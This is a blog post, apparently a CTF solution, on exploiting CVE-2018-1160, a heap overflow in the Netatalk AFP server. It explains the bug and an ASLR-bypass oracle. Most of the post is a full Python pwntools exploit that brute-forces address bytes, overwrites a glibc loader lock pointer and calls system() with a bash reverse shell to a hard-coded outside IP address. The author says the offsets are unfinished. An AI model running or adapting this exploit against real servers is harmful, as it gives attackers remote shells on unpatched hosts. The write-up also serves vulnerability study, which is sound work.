---
layout: post
title: "CVE-2018-1160: Netatalk RCE"
date: 2022-07-15
permalink: /:title/
description: "Exploitation of an Apple Filing Protocol Server"
tags: [ctf, n-day]
share: true
comments: false
published: true
status: ongoing
---

---
* toc
{:toc}
---

This is the solution to a Pwnable.tw challenge, as well as
an n-day exploit. At the time of writing only ~~87~~ 88
players managed to solve it. The most troublesome part is
finding the correct offset against the challenge server,
which is `Ubuntu 16.04 Kernel x86-64 4.9.0`.

## Bug analysis 

The root cause has already been thoroughly explained in many other blog posts
so I won't delve too much into that.  
AFP (Apple Filing Protocol) is an old server protocol that can be thought as
SMB for Apple's filesystem.  
The vulnerability is a heap overflow in
`dsi_opensess.c` that occurs when trying to open a new session with the server.  
The 255 bytes overflow allows an attacker to overwrite the pointer at which
subsequent packets are written to. Given knowledge of the memory layout of the
process, the second packet can be used to overwrite function pointers in
memory, for example malloc's internal hooks (i.e. `__free_hook`).

What hasn't been touched upon as much is how to reliably defeat ASLR: the
original discovery of the bug abused the fact that the binary wasn't compiled
with PIE (Position Indipendent Executable) enabled.

## ASLR in Netatalk server

Due to the client-server architecture, the application behaves as a oracle by
crashing the thread when writing to an invalid memory address and responding
over the socket when writing to a valid one. Doing this allows an attacker to
leak a memory address in $$2^8 \cdot 3$$ attempts.

## ASLR bypass

_This is work in progress, the final exploit needs its offsets to be adjusted against the challenge's server._ 

## Exploitation strategy

Memory corruption attacks usually make use of existing
program functionalities to redirect control flow.
In this instance overwriting
`_rtld_global._dl_rtld_lock_recursive`, which is a function
invocked when `exit(...)` is called, is a reliable path to
obtain code execution as soon as the program tries to clean
up the thread used to handle the request.  
Its function arguments can be found in
`_rtld_global._dl_load_lock`.

## Full exploit code

```python
1  from pwn import *
2  from time import sleep
3  from random import uniform
4  
5  
6  elf = ELF('./afpd')
7  libc = ELF('./libc.so.6')
8  
9  DSI_FLAGS = {
10      "request": 0x0,
11      "response": 0x1
12  }
13  
14  DSI_CMD = {
15      "get_status": 0x3,
16      "open_sess": 0x4,
17      "tickle": 0x5
18  }
19  
20  if args['REMOTE']:
21      HOST = "chall.pwnable.tw"
22      PORT = 10002
23  else:
24      HOST = "localhost"
25      PORT = 5566
26  
27  def new_dsi_header(flag, command, request_id, offset, data_len):
28  
29      DSI_FLAGS = p8(flag, endian='big')
30      DSI_COMMAND = p8(command, endian='big')
31      DSI_REQUEST_ID = p16(request_id, endian='big')
32      DSI_ERROR = p32(offset, endian='big')
33      DSI_DATA_LENGTH = p32(data_len, endian='big')
34      DSI_RESERVED = p32(0x0, endian='big')
35  
36      pck  = DSI_FLAGS
37      pck += DSI_COMMAND
38      pck += DSI_REQUEST_ID
39      pck += DSI_ERROR
40      pck += DSI_DATA_LENGTH
41      pck += DSI_RESERVED
42  
43      return pck
44  
45  def send_afp(payload, req_id=0x0):
46  
47      context(endian='big')
48  
49      io = remote(HOST, PORT, level='error')
50  
51      error_code = 0x0
52  
53      p = p8(0x1, endian='big')
54      p += p8(16 + len(payload), endian='big')
55      p += p32(0x41414141)
56      p += p32(0x42424242)
57      p += p32(0x66666666)    # server quantum
58      p += p32(0x43434343)    # client/server id
59      p += payload            # cmd pointer
60  
61      packet = new_dsi_header(DSI_FLAGS["request"], DSI_CMD["open_sess"], req_id, error_code, len(p))
62      packet += p
63  
64      io.send(packet)
65      io.recv()
66  
67      try:
68          reverse_shell = b"bash -c 'bash -i >& /dev/tcp/139.162.131.224/12345 0>&1' \x00"
69          trigger = reverse_shell.ljust(0x5f8) + p64(libc_base + libc.symbols['system'], endian='little')
70          packet = new_dsi_header(DSI_FLAGS["request"], DSI_CMD["open_sess"], req_id+1, error_code, len(trigger))
71          packet += trigger
72      except:
73          pass
74  
75      try:
76          io.send(packet)
77          io.close()
78      except Exception as ex:
79          pass
80  
81  def bruteforce_aslr():
82      context(endian='big')
83      leak_addr = b''
84  
85      req_id = 0x0
86      error_code = 0x0
87  
88      if args['SKIP']:
89          return int(args['SKIP'], 0)
90  
91      for b in range(8):
92          for i in range(256):
93              print(f"[*] trying byte: {hex(i)} in offset√ä{b}", end="\r")
94              io = remote(HOST, PORT, level='error')
95  
96              payload = b"\x01" + p8(0x11 + b) + b"a"*0x10 + leak_addr + p8(i)
97              packet = new_dsi_header(DSI_FLAGS["request"], DSI_CMD["open_sess"], req_id, error_code, len(payload))
98              packet += payload
99  
100              io.send(packet)
101              try:
102                  a = io.recv()
103                  leak_addr += p8(i)
104                  log.success(str(hex(i)))
105                  io.close()
106                  break
107              except:
108                  io.close()
109  
110      print("\n")
111      log.success(hex(u64(leak_addr,endian='little')) + "\n")
112  
113      return int.from_bytes(leak_addr, 'little')
114  
115  rtld_off = 0x61b060
116  _dl_load_lock_off = 2312
117  leaked_addr = bruteforce_aslr()
118  print("memory address: " + hex(leaked_addr))
119  
120  if args['LIBC_OFF']:
121      libc_base = leaked_addr - 0x817000
122      rtld_addr = libc_base + rtld_off + _dl_load_lock_off
123  
124      try:
125          send_afp(p64(rtld_addr, endian='little'))
126      except:
127          pass
128  else:
129      # try every memory page-aligned address (assuming leaked_addr is page-aligned)
130      # for offset in range(-0xfffff000, 0xfffff000, 0x1000):
131      for offset in range(0, 0x6000000, 0x1000):
132          for rtld_off in [0x61b060, 0xed4060]:
133  
134              libc_base = leaked_addr - offset
135              rtld_addr = libc_base + rtld_off + _dl_load_lock_off
136  
137              try:
138                  r = uniform(0, 0.2)
139                  print(f"[*] looking for libc base: {hex(libc_base + offset)} - {hex(offset)}, waiting {r}", end="\r")
140                  sleep(r)
141                  send_afp(p64(rtld_addr, endian='little'))
142              except:
143                  pass
144  
145      print("\n")
146      log.success("end")
```


